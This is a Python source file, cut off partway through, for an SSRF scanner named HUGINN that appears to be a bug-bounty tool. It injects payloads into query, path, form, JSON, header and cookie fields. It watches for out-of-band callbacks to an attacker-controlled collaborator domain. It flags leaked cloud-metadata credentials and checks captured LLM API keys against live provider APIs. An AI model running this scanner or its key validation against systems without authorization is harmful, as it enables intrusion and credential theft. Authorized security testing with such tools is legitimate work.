#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  HUGINN :: ssrf.py — v4.0
#  Server-Side Request Forgery Scanner
# -----------------------------------------------------------------------------
#  v4.0 changes vs previous:
#    · Program header loading from output/<PROGRAM>/headers/default.txt
#      (auto-detected; also settable via --headers-file)
#    · ALL transports now merge static headers — header/cookie/HPP routes fixed
#    · cURL output includes static headers so commands reproduce exactly
#    · LLM API key detection + read-only validation
#      (openai/anthropic/google/groq/huggingface/replicate/fireworks)
#    · Valid-key detection escalates credential-leak findings to "confirmed"
#    · WAF/challenge fingerprinting (CF/Akamai/Imperva/DataDome/Sucuri/AWS/F5)
#    · 3-sample statistical baseline (length mean + σ, timing median + σ)
#    · Directional length-delta (positive only) with anchored IP-marker check
#    · Path-segment SPA pre-flight (random-string probe)
#    · Auth-token redaction in log lines (never print full key)
#    · Skip post-scan sleep when no OOB tokens were issued
# =============================================================================

import re
import json
import time
import shlex
import hashlib
import threading
from pathlib import Path
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin, quote, unquote)
from concurrent.futures import ThreadPoolExecutor, as_completed

from huginn_utils import (
    log, section, load_json, save_json, load_payloads, send_request,
    safe_filename, C,
    random_token, build_oob_url,
)

try:
    import requests
except ImportError:
    requests = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# =============================================================================
#  CONSTANTS
# =============================================================================
DEFAULT_ATTACKER     = "beardedviking.org"
DEFAULT_COLLAB       = "oast.beardedviking.org"
DEFAULT_CANARY       = "redirect.beardedviking.org"
DEFAULT_OOB_CHECK    = "https://oast.beardedviking.org/check.php"

INTERNAL_MARKERS = [
    "redis_version", "memcached", "STAT version",
    "elasticsearch", "cluster_name",
    "root:x:0:0", "daemon:x:", "/bin/bash",
    "ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
    "computemetadata", "metadata-flavor",
    "access_token", "AuthenticationResult",
    "kubelet", "kubernetes", "pods",
    "Docker", "containers/json",
    "droplet_id", "opc/v1", "opc/v2",
    "iam/security-credentials", "user-data",
    "ssh-rsa", "BEGIN OPENSSH", "BEGIN RSA",
    "DB_PASSWORD", "DATABASE_URL", "AWS_SECRET",
    "mongodb://", "postgresql://", "mysql://",
]

CREDENTIAL_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "SessionToken",
    "access_token", "refresh_token", "client_secret",
    "private_key", "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",
    "client_id", "aws_access_key_id", "aws_secret_access_key",
    "X-Amz-Security-Token", "AuthenticationResult",
]

METADATA_MARKERS = [
    "169.254.169.254", "100.100.100.200", "169.254.170.2",
    "metadata.google.internal", "metadata/v1", "opc/v1", "opc/v2",
    "latest/meta-data", "computeMetadata",
]

FUZZABLE_HEADERS = [
    "Referer", "User-Agent", "X-Forwarded-For", "X-Forwarded-Host",
    "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Client-IP", "Forwarded", "Origin", "Host",
    "X-Original-URL", "X-Rewrite-URL", "X-Callback-Url",
    "X-Auth-Token", "X-Api-Key", "Callback-Url",
]

ROUTE_HEADER_CATEGORY = "header_based"
ROUTE_COOKIE_CATEGORY = "cookie_based"
ROUTE_HPP_CATEGORY    = "parameter_pollution"

TIME_DELAY_THRESHOLD   = 3.5
LENGTH_DELTA_THRESHOLD = 500

SKIP_EXTENSIONS = {
    ".js", ".mjs", ".css", ".map",
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".bmp",
    ".woff", ".woff2", ".ttf", ".otf", ".eot",
    ".mp3", ".mp4", ".webm", ".wav", ".ogg", ".ogv",
    ".pdf", ".zip", ".tar", ".gz", ".7z", ".rar",
    ".exe", ".dll", ".so", ".bin",
}

# Anchored IP / internal-service markers. Full-segment, not substring.
_IP_MARKER_RE = re.compile(
    r"(?:^|[/@\s\"'=:&?])"
    r"(?:"
    r"127\.\d+\.\d+\.\d+|"
    r"10\.\d+\.\d+\.\d+|"
    r"172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|"
    r"192\.168\.\d+\.\d+|"
    r"169\.254\.\d+\.\d+|"
    r"100\.100\.100\.200|"
    r"0\.0\.0\.0|"
    r"\[?::1\]?|"
    r"localhost|"
    r"metadata\.(?:google|azure|oracle)|"
    r"\.internal\b|"
    r"\.local\b"
    r")"
    r"(?:[/:\s\"'#?&]|$)",
    re.I,
)

# =============================================================================
#  WAF / CHALLENGE FINGERPRINTS
# =============================================================================
WAF_CHALLENGE_PATTERNS = [
    (re.compile(r"Just a moment\.\.\.", re.I),                      "cloudflare_challenge"),
    (re.compile(r"challenges\.cloudflare\.com", re.I),              "cloudflare_challenge"),
    (re.compile(r"cf-chl-", re.I),                                  "cloudflare_challenge"),
    (re.compile(r"__cf_chl_", re.I),                                "cloudflare_challenge"),
    (re.compile(r"Attention Required!\s*\|\s*Cloudflare", re.I),    "cloudflare_block"),
    (re.compile(r"Ray ID:\s*[0-9a-f]{6,}", re.I),                   "cloudflare_block"),
    (re.compile(r"Reference\s*#\d+\.\w+", re.I),                    "akamai_block"),
    (re.compile(r"Pardon Our Interruption", re.I),                  "akamai_block"),
    (re.compile(r"_Incapsula_Resource", re.I),                      "imperva_block"),
    (re.compile(r"Incapsula incident ID", re.I),                    "imperva_block"),
    (re.compile(r"DataDome", re.I),                                 "datadome_block"),
    (re.compile(r"Sucuri WebSite Firewall", re.I),                  "sucuri_block"),
    (re.compile(r"aws-waf-token", re.I),                            "aws_waf"),
]

# =============================================================================
#  LLM API KEY PATTERNS  (unambiguous prefixes only)
# =============================================================================
LLM_KEY_PATTERNS = [
    ("anthropic",   re.compile(r"sk-ant-[A-Za-z0-9]{2,10}-[A-Za-z0-9_\-]{80,200}")),
    ("openai",      re.compile(r"sk-proj-[A-Za-z0-9_\-]{40,200}")),
    ("openai",      re.compile(r"sk-(?!ant-|proj-)[A-Za-z0-9]{40,60}(?![A-Za-z0-9_\-])")),
    ("google",      re.compile(r"AIza[0-9A-Za-z_\-]{35}")),
    ("huggingface", re.compile(r"hf_[A-Za-z0-9]{30,80}")),
    ("groq",        re.compile(r"gsk_[A-Za-z0-9]{40,80}")),
    ("perplexity",  re.compile(r"pplx-[A-Za-z0-9]{40,80}")),
    ("replicate",   re.compile(r"r8_[A-Za-z0-9]{30,80}")),
    ("fireworks",   re.compile(r"fw_[A-Za-z0-9]{30,80}")),
]


# =============================================================================
#  HEADER FILE LOADER
# =============================================================================
def load_program_headers(program_dir, filename="default.txt", explicit_path=None):
    """
    Load per-program request headers.

    Resolution order:
      1. explicit_path (from --headers-file)
      2. <program_dir>/headers/<filename>
      3. <program_dir>/../headers/<filename>

    Supported formats (auto-detected):
      A) Simple:   one 'Name: value' per line
      B) Raw HTTP: 'GET /path HTTP/1.1' or 'HTTP/1.1 200 OK' then headers,
                   stops at first blank line
      C) JSON:     {"Header": "value", ...}

    Comments (# or //) and blank lines are skipped. Multiple Cookie: lines
    are joined with '; '.
    """
    candidates = []
    if explicit_path:
        candidates.append(Path(explicit_path))
    pdir = Path(program_dir)
    candidates.append(pdir / "headers" / filename)
    candidates.append(pdir.parent / "headers" / filename)

    path = None
    for c in candidates:
        if c and c.exists() and c.is_file():
            path = c
            break
    if not path:
        return {}, None

    try:
        raw = path.read_text(errors="ignore")
    except Exception:
        return {}, None

    stripped = raw.lstrip()
    # JSON format
    if stripped.startswith("{"):
        try:
            data = json.loads(raw)
            if isinstance(data, dict):
                out = {}
                for k, v in data.items():
                    out[str(k)] = str(v)
                return out, path
        except Exception:
            pass

    # Line-based / raw-HTTP
    out = {}
    cookies = []
    in_headers = False
    for line in raw.splitlines():
        s = line.rstrip("\r")
        if not s.strip():
            if in_headers:
                break
            continue
        if s.lstrip().startswith(("#", "//")):
            continue
        # Request/status line — marks the start of a header block
        if re.match(r"^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|HTTP/)\b", s.strip(), re.I):
            in_headers = True
            continue
        if ":" not in s:
            continue
        name, _, val = s.partition(":")
        name = name.strip()
        val = val.strip()
        if not name:
            continue
        if name.lower() == "cookie":
            cookies.append(val)
        else:
            out[name] = val
    if cookies:
        out["Cookie"] = "; ".join(cookies)

    return out, path


# =============================================================================
#  PLACEHOLDER SUBSTITUTION
# =============================================================================
def _substitute_all(payload, attacker, target, collab, canary,
                    oob_url, oob_host, canary_url, token):
    return (payload
            .replace("{{ATTACKER}}",   attacker)
            .replace("{{TARGET}}",     target)
            .replace("{{COLLAB}}",     collab)
            .replace("{{CANARY}}",     canary)
            .replace("{{OOB}}",        oob_url)
            .replace("{{OOB_HOST}}",   oob_host)
            .replace("{{CANARY_URL}}", canary_url)
            .replace("{{RANDOM}}",     f"huginn-{token}"))


# =============================================================================
#  HELPERS
# =============================================================================
def _build_query_string(params):
    """Preserve existing percent-encoding in payload values."""
    pairs = []
    for k, v in params.items():
        if isinstance(v, list):
            for item in v:
                pairs.append(f"{quote(str(k), safe='')}={item}")
        else:
            pairs.append(f"{quote(str(k), safe='')}={v}")
    return "&".join(pairs)


def _parse_header_payload(payload):
    if "|" in payload:
        out = {}
        for chunk in payload.split("|"):
            if ":" not in chunk:
                return None
            name, _, val = chunk.partition(":")
            out[name.strip()] = val.strip()
        return out or None
    if ":" in payload:
        name, _, val = payload.partition(":")
        return {name.strip(): val.strip()}
    return None


def _parse_cookie_payload(payload):
    if "=" not in payload:
        return None
    name, _, val = payload.partition("=")
    return {name.strip(): val.strip()}


def _match_any(body, markers):
    if not body:
        return None
    low = body.lower()
    for m in markers:
        if m.lower() in low:
            return m
    return None


def _is_credential_leak(body):
    return _match_any(body, CREDENTIAL_MARKERS)


def _contains_detection_string(body, detection_field):
    if not body or not detection_field:
        return None
    quoted = re.findall(r"'([^']+)'|\"([^\"]+)\"", detection_field)
    candidates = [a or b for a, b in quoted]
    for c in candidates:
        if c.lower() in body.lower():
            return c
    return None


def _is_metadata_body(body):
    if not body:
        return None
    low = body.lower()
    for m in METADATA_MARKERS:
        if m.lower() in low:
            return m
    return None


def _response_snippet(body, needle, window=180):
    if not body:
        return ""
    if not needle:
        return body[:window * 2]
    idx = body.lower().find(needle.lower())
    if idx == -1:
        return body[:window * 2]
    return body[max(0, idx - window): idx + len(needle) + window]


def _detect_waf_challenge(resp):
    if resp is None:
        return None
    body = resp.text or ""
    if not body:
        return None
    for pat, tag in WAF_CHALLENGE_PATTERNS:
        if pat.search(body):
            return tag
    return None


def _url_extension(url):
    path = urlparse(url).path
    if "." not in path.rsplit("/", 1)[-1]:
        return ""
    return "." + path.rsplit(".", 1)[-1].lower()


def _is_static_url(url):
    return _url_extension(url) in SKIP_EXTENSIONS


# =============================================================================
#  LLM API KEY DETECTION + VALIDATION
# =============================================================================
#  Design principles:
#    · Read-only endpoints only. Never /chat/completions.
#    · 200 → key valid + usable
#    · 402 → key valid but out of credit (still reportable, high value)
#    · 429 → key valid but rate-limited (still reportable)
#    · 401 → key invalid / revoked → don't escalate
#    · 403 → ambiguous (may be valid, scope-forbidden)
#    · Cache by body hash so the same leak doesn't re-validate
# =============================================================================

_KEY_VALIDATION_CACHE = {}
_KEY_VALIDATION_LOCK = threading.Lock()


def _mask_key(k):
    if not k:
        return "***"
    if len(k) < 16:
        return k[:4] + "***"
    return k[:10] + "..." + k[-4:]


def detect_llm_keys(body):
    """Return list of (provider, key, redacted_context)."""
    if not body:
        return []
    found, seen = [], set()
    for provider, pat in LLM_KEY_PATTERNS:
        for m in pat.finditer(body):
            k = m.group(0)
            if k in seen:
                continue
            seen.add(k)
            start = max(0, m.start() - 60)
            end = min(len(body), m.end() + 60)
            ctx = body[start:end].replace(k, _mask_key(k))
            found.append((provider, k, ctx))
    return found


def _interpret(resp, provider, key_prefix):
    result = {
        "provider": provider,
        "key_prefix": key_prefix,
        "valid": None,
        "usable": None,
        "plan_hint": "unknown",
        "balance_hint": "unknown",
        "status_code": None,
        "rate_limited": False,
        "checked_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    if resp is None:
        return result
    result["status_code"] = resp.status_code
    sc = resp.status_code
    if sc == 200:
        result["valid"] = True
        result["usable"] = True
        result["plan_hint"] = "active"
        result["balance_hint"] = "ok"
    elif sc == 401:
        result["valid"] = False
        result["usable"] = False
        result["balance_hint"] = "n/a"
    elif sc == 402:
        result["valid"] = True
        result["usable"] = False
        result["balance_hint"] = "exhausted"
    elif sc == 403:
        result["valid"] = "unknown"
        result["usable"] = False
        result["balance_hint"] = "restricted"
    elif sc == 429:
        result["valid"] = True
        result["usable"] = False
        result["rate_limited"] = True
        result["balance_hint"] = "rate_limited"
    else:
        result["valid"] = "unknown"
    rate_headers = {}
    for hk, hv in (resp.headers or {}).items():
        hk_low = hk.lower()
        if "ratelimit" in hk_low or hk_low.startswith("x-rate"):
            rate_headers[hk] = hv
    if rate_headers:
        result["rate_headers"] = rate_headers
    return result


def _validate_openai(key, timeout=10):
    try:
        r = requests.get("https://api.openai.com/v1/models",
                         headers={"Authorization": f"Bearer {key}"},
                         timeout=timeout)
        return _interpret(r, "openai", _mask_key(key))
    except Exception as e:
        return {"provider": "openai", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_anthropic(key, timeout=10):
    try:
        r = requests.get("https://api.anthropic.com/v1/models",
                         headers={"x-api-key": key,
                                  "anthropic-version": "2023-06-01"},
                         timeout=timeout)
        return _interpret(r, "anthropic", _mask_key(key))
    except Exception as e:
        return {"provider": "anthropic", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_google(key, timeout=10):
    try:
        r = requests.get(
            f"https://generativelanguage.googleapis.com/v1beta/models?key={key}",
            timeout=timeout)
        return _interpret(r, "google", _mask_key(key))
    except Exception as e:
        return {"provider": "google", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_huggingface(key, timeout=10):
    try:
        r = requests.get("https://huggingface.co/api/whoami-v2",
                         headers={"Authorization": f"Bearer {key}"},
                         timeout=timeout)
        return _interpret(r, "huggingface", _mask_key(key))
    except Exception as e:
        return {"provider": "huggingface", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_groq(key, timeout=10):
    try:
        r = requests.get("https://api.groq.com/openai/v1/models",
                         headers={"Authorization": f"Bearer {key}"},
                         timeout=timeout)
        return _interpret(r, "groq", _mask_key(key))
    except Exception as e:
        return {"provider": "groq", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_replicate(key, timeout=10):
    try:
        r = requests.get("https://api.replicate.com/v1/account",
                         headers={"Authorization": f"Bearer {key}"},
                         timeout=timeout)
        return _interpret(r, "replicate", _mask_key(key))
    except Exception as e:
        return {"provider": "replicate", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_fireworks(key, timeout=10):
    try:
        r = requests.get("https://api.fireworks.ai/inference/v1/models",
                         headers={"Authorization": f"Bearer {key}"},
                         timeout=timeout)
        return _interpret(r, "fireworks", _mask_key(key))
    except Exception as e:
        return {"provider": "fireworks", "valid": None, "error": str(e),
                "key_prefix": _mask_key(key)}


def _validate_perplexity(key, timeout=10):
    # No public read-only endpoint available; report structural match only.
    return {
        "provider": "perplexity",
        "valid": "unknown",
        "usable": "unknown",
        "balance_hint": "unknown",
        "key_prefix": _mask_key(key),
        "note": "perplexity has no read-only validation endpoint",
    }


KEY_VALIDATORS = {
    "openai":      _validate_openai,
    "anthropic":   _validate_anthropic,
    "google":      _validate_google,
    "huggingface": _validate_huggingface,
    "groq":        _validate_groq,
    "replicate":   _validate_replicate,
    "fireworks":   _validate_fireworks,
    "perplexity":  _validate_perplexity,
}


def validate_llm_keys(body, timeout=10, cache_key=None):
    """Detect + validate all LLM keys in a body. Cached by cache_key."""
    if requests is None or not body:
        return []
    if cache_key:
        with _KEY_VALIDATION_LOCK:
            if cache_key in _KEY_VALIDATION_CACHE:
                return _KEY_VALIDATION_CACHE[cache_key]

    out = []
    for provider, key, context in detect_llm_keys(body):
        fn = KEY_VALIDATORS.get(provider)
        if not fn:
            continue
        result = fn(key, timeout=timeout)
        result["detection_context"] = context
        out.append(result)
        log(f"  [KEY-VALIDATE] {provider} {result.get('key_prefix')} → "
            f"status={result.get('status_code')} "
            f"valid={result.get('valid')} "
            f"balance={result.get('balance_hint')}",
            "info", "SSRF")

    if cache_key:
        with _KEY_VALIDATION_LOCK:
            _KEY_VALIDATION_CACHE[cache_key] = out
    return out


# =============================================================================
#  INJECTION POINT MODEL
# =============================================================================
class InjectionPoint:
    __slots__ = ("url", "method", "location", "name", "value",
                 "json_path", "json_body", "form_data", "extra_headers",
                 "baseline_resp", "baseline_elapsed",
                 "baseline_len_mean", "baseline_len_stddev",
                 "timing_median", "timing_stddev",
                 "skipped_reason", "is_path_segment", "is_host_header")

    def __init__(self, url, method, location, name, value,
                 json_path=None, json_body=None, form_data=None,
                 extra_headers=None):
        self.url = url
        self.method = method
        self.location = location
        self.name = name
        self.value = value
        self.json_path = json_path
        self.json_body = json_body
        self.form_data = form_data
        self.extra_headers = extra_headers or {}
        self.baseline_resp = None
        self.baseline_elapsed = None
        self.baseline_len_mean = None
        self.baseline_len_stddev = None
        self.timing_median = None
        self.timing_stddev = None
        self.skipped_reason = None
        self.is_path_segment = (location == "path")
        self.is_host_header = (location == "header" and name.lower() == "host")

    def key(self):
        return (self.url, self.method, self.location, self.name)

    def __repr__(self):
        return f"<IP {self.location}:{self.name} @ {self.method} {self.url}>"


# =============================================================================
#  INJECTION POINT EXTRACTION
# =============================================================================
def _extract_query_params(page):
    p = urlparse(page["url"])
    if not p.query:
        return []
    qs = parse_qs(p.query, keep_blank_values=True)
    return [InjectionPoint(page["url"], "GET", "query", k, v[0])
            for k, v in qs.items()]


def _extract_path_segments(page):
    p = urlparse(page["url"])
    segs = [s for s in p.path.split("/") if s]
    if not segs:
        return []
    out = []
    for i, seg in enumerate(segs):
        if _is_static_url(f"http://x/{seg}"):
            continue
        out.append(InjectionPoint(
            page["url"], "GET", "path", f"segment[{i}]", seg,
            extra_headers={"_segment_index": str(i)},
        ))
    return out


def _extract_forms(page):
    if BeautifulSoup is None:
        return []
    html = page.get("content") or ""
    if not html:
        return []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return []
    points = []
    for form in soup.find_all("form"):
        action = form.get("action") or page["url"]
        action_url = urljoin(page["url"], action)
        method = (form.get("method") or "GET").upper()
        data = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            if inp.has_attr("type") and inp["type"].lower() in ("submit", "button", "file"):
                continue
            data[name] = inp.get("value") or ""
        for name, value in data.items():
            points.append(InjectionPoint(
                action_url, method, "body_form", name, value,
                form_data=dict(data),
            ))
    return points


def _extract_headers(page):
    return [InjectionPoint(page["url"], "GET", "header", h, "")
            for h in FUZZABLE_HEADERS]


def _extract_cookies(page):
    headers = page.get("headers") or {}
    sc = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
    if not sc:
        return []
    points = []
    for chunk in sc.split(","):
        m = re.match(r"\s*([^=]+)=([^;]+)", chunk)
        if m:
            points.append(InjectionPoint(
                page["url"], "GET", "cookie",
                m.group(1).strip(), m.group(2).strip(),
            ))
    return points


def _extract_json_body(page):
    ct = (page.get("content_type") or "").lower()
    content = page.get("content") or ""
    if "json" not in ct and not content.lstrip().startswith(("{", "[")):
        return []
    try:
        body = json.loads(content)
    except Exception:
        return []
    points = []

    def walk(obj, path="$"):
        if isinstance(obj, dict):
            for k, v in obj.items():
                walk(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                walk(v, f"{path}[{i}]")
        else:
            points.append(InjectionPoint(
                page["url"], "POST", "body_json", path, str(obj),
                json_path=path, json_body=body,
            ))

    walk(body)
    return points


def extract_injection_points(pages):
    points, seen = [], set()
    for page in pages:
        if _is_static_url(page.get("url", "")):
            continue
        cands = []
        cands.extend(_extract_query_params(page))
        cands.extend(_extract_path_segments(page))
        cands.extend(_extract_forms(page))
        cands.extend(_extract_headers(page))
        cands.extend(_extract_cookies(page))
        cands.extend(_extract_json_body(page))
        for ip in cands:
            k = ip.key()
            if k in seen:
                continue
            seen.add(k)
            points.append(ip)
    return points


# =============================================================================
#  REQUEST + cURL BUILDERS
# =============================================================================
def _set_json_path(obj, path, value):
    tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
    if not tokens:
        return
    cur = obj
    for i, (name, idx) in enumerate(tokens):
        key = name if name else int(idx)
        if i == len(tokens) - 1:
            try:
                cur[key] = value
            except Exception:
                pass
            return
        try:
            cur = cur[key]
        except Exception:
            return


def _merged_headers(ip, payload_meta, static_headers):
    """Static headers first, then per-point extras, then payload extras.
    Payload extras win on conflict."""
    h = {}
    if static_headers:
        h.update(static_headers)
    if ip.extra_headers:
        for k, v in ip.extra_headers.items():
            if not k.startswith("_"):
                h[k] = v
    if payload_meta and payload_meta.get("headers"):
        h.update(payload_meta["headers"])
    return h


def build_request(ip, payload, payload_meta=None, timeout=15,
                  static_headers=None):
    payload_meta = payload_meta or {}
    headers = _merged_headers(ip, payload_meta, static_headers)
    override_method = (payload_meta.get("method") or "").upper() or None
    override_data = payload_meta.get("data")

    url = ip.url
    method = override_method or ip.method
    data = override_data

    if ip.location == "query":
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=_build_query_string(qs)))

    elif ip.location == "path":
        idx = int(ip.extra_headers.get("_segment_index", "0"))
        p = urlparse(url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))

    elif ip.location == "body_form":
        body = dict(ip.form_data or {})
        body[ip.name] = payload
        if method == "GET":
            p = urlparse(url)
            url = urlunparse(p._replace(query=_build_query_string(body)))
            data = None
        else:
            data = body
            headers.setdefault("Content-Type",
                               "application/x-www-form-urlencoded")

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        data = json.dumps(body)
        headers.setdefault("Content-Type", "application/json")

    elif ip.location == "cookie":
        existing = headers.get("Cookie", "")
        pair = f"{ip.name}={payload}"
        headers["Cookie"] = f"{existing}; {pair}".strip("; ") if existing else pair

    elif ip.location == "header":
        headers[ip.name] = payload

    return send_request(
        url, method=method, headers=headers,
        timeout=timeout, allow_redirects=False, data=data,
    )


def build_curl(ip, payload, payload_meta=None, timeout=15, static_headers=None):
    payload_meta = payload_meta or {}
    override_method = (payload_meta.get("method") or "").upper() or None
    headers = _merged_headers(ip, payload_meta, static_headers)

    parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]

    if ip.location == "query":
        p = urlparse(ip.url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=_build_query_string(qs)))
        for k, v in headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(url))

    elif ip.location == "path":
        idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
        p = urlparse(ip.url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))
        for k, v in headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(url))

    elif ip.location == "body_form":
        body = dict(ip.form_data or {})
        body[ip.name] = payload
        if ip.method == "GET":
            p = urlparse(ip.url)
            url = urlunparse(p._replace(query=_build_query_string(body)))
            for k, v in headers.items():
                parts.extend(["-H", shlex.quote(f"{k}: {v}")])
            parts.append(shlex.quote(url))
        else:
            parts.extend(["-X", override_method or "POST"])
            for k, v in headers.items():
                parts.extend(["-H", shlex.quote(f"{k}: {v}")])
            for k, v in body.items():
                parts.extend(["--data-urlencode", shlex.quote(f"{k}={v}")])
            parts.append(shlex.quote(ip.url))

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        parts.extend(["-X", override_method or "POST"])
        for k, v in headers.items():
            if k.lower() == "content-type":
                continue
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote("Content-Type: application/json")])
        parts.extend(["--data-raw", shlex.quote(json.dumps(body))])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "cookie":
        cookie_parts = []
        other_headers = []
        for k, v in headers.items():
            if k.lower() == "cookie":
                cookie_parts.append(v)
            else:
                other_headers.append((k, v))
        cookie_parts.append(f"{ip.name}={payload}")
        for k, v in other_headers:
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote(f"Cookie: {'; '.join(cookie_parts)}")])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "header":
        for k, v in headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote(f"{ip.name}: {payload}")])
        parts.append(shlex.quote(ip.url))

    else:
        for k, v in headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(ip.url))

    return " ".join(parts)


# =============================================================================
#  OOB POLLERS  (unchanged from previous)
# =============================================================================
class RemoteOOBPoller:
    def __init__(self, check_url, poll_interval=4.0, timeout=180.0, verify=False):
        self.check_url = check_url.rstrip("/")
        self.poll_interval = poll_interval
        self.timeout = timeout
        self.verify = verify
        self._seen = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        if requests is None:
            return False
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)

    def _loop(self):
        deadline = time.time() + self.timeout
        endpoint = f"{self.check_url}?list=1"
        while not self._stop.is_set() and time.time() < deadline:
            try:
                r = requests.get(endpoint, timeout=6, verify=self.verify)
                if r.status_code == 200:
                    data = r.json()
                    toks = data.get("tokens", {})
                    if isinstance(toks, dict):
                        with self._lock:
                            for tok in toks.keys():
                                self._seen.add(tok.lower())
            except Exception:
                pass
            time.sleep(self.poll_interval)

    def has_token(self, token):
        if not token:
            return False
        with self._lock:
            return token.lower() in self._seen

    def all_tokens(self):
        with self._lock:
            return set(self._seen)

    def any_tokens(self):
        return bool(self.all_tokens())


class LocalOOBPoller:
    def __init__(self, log_file, poll_interval=2.0, timeout=180.0):
        self.log_file = Path(log_file)
        self.poll_interval = poll_interval
        self.timeout = timeout
        self._seen = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        if not self.log_file or not self.log_file.exists():
            return False
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)

    def _loop(self):
        deadline = time.time() + self.timeout
        last_size = 0
        while not self._stop.is_set() and time.time() < deadline:
            try:
                size = self.log_file.stat().st_size
                if size != last_size:
                    content = self.log_file.read_text(errors="ignore")
                    for m in re.finditer(r"huginn-([a-f0-9]{16,32})", content):
                        with self._lock:
                            self._seen.add(m.group(1).lower())
                    last_size = size
            except Exception:
                pass
            time.sleep(self.poll_interval)

    def has_token(self, token):
        if not token:
            return False
        with self._lock:
            return token.lower() in self._seen

    def all_tokens(self):
        with self._lock:
            return set(self._seen)

    def any_tokens(self):
        return bool(self.all_tokens())


# =============================================================================
#  SCANNER
# =============================================================================
class SSRFScanner:

    def __init__(self,
                 program_dir,
                 sites_root=None,
                 attacker_domain=DEFAULT_ATTACKER,
                 collab_host=DEFAULT_COLLAB,
                 canary_host=DEFAULT_CANARY,
                 oob_check_url=DEFAULT_OOB_CHECK,
                 target_domain=None,
                 provider_filter=None,
                 max_workers=6,
                 delay=0.2,
                 timeout=15,
                 oob_log_file=None,
                 oob_timeout=180.0,
                 headers_file=None,
                 validate_keys=True,
                 key_validation_timeout=10):
        self.program_dir = Path(program_dir)
        self.sites_root = Path(sites_root or (self.program_dir / "sites"))
        self.findings_root = self.program_dir / "findings" / "ssrf"
        self.findings_root.mkdir(parents=True, exist_ok=True)

        self.attacker_domain = attacker_domain
        self.collab_host     = collab_host
        self.canary_host     = canary_host
        self.oob_check_url   = oob_check_url
        self.target_domain   = target_domain or ""
        self.provider_filter = (provider_filter or "").lower() or None
        self.max_workers     = max_workers
        self.delay           = delay
        self.timeout         = timeout
        self.validate_keys   = validate_keys
        self.key_validation_timeout = key_validation_timeout

        self.seen_signatures = set()
        self._payloads = None
        self._tokens_by_id = {}

        # ---- Load program headers ---------------------------------------
        self.static_headers, headers_path = load_program_headers(
            self.program_dir, explicit_path=headers_file)
        self.headers_path = headers_path

        # ---- OOB poller selection ---------------------------------------
        if oob_log_file:
            self.oob_poller = LocalOOBPoller(oob_log_file, timeout=oob_timeout)
        elif oob_check_url:
            self.oob_poller = RemoteOOBPoller(oob_check_url, timeout=oob_timeout)
        else:
            self.oob_poller = None

        self._oob_tokens_issued = set()
        self._oob_lock = threading.Lock()

    # ------------------------------------------------------------------ #
    def load_and_filter_payloads(self):
        data = load_payloads("ssrf")
        raw = data.get("payloads", [])
        ctx_target = self.target_domain or "target.invalid"
        out = []

        for entry in raw:
            if isinstance(entry, str):
                token = random_token()
                oob_url = build_oob_url(self.collab_host, token, path_hint="ssrf")
                canary_url = f"https://{self.canary_host}/huginn-{token}/raw"
                p = _substitute_all(
                    entry, self.attacker_domain, ctx_target,
                    self.collab_host, self.canary_host,
                    oob_url, urlparse(oob_url).netloc, canary_url, token,
                )
                with self._oob_lock:
                    self._oob_tokens_issued.add(token)
                out.append({
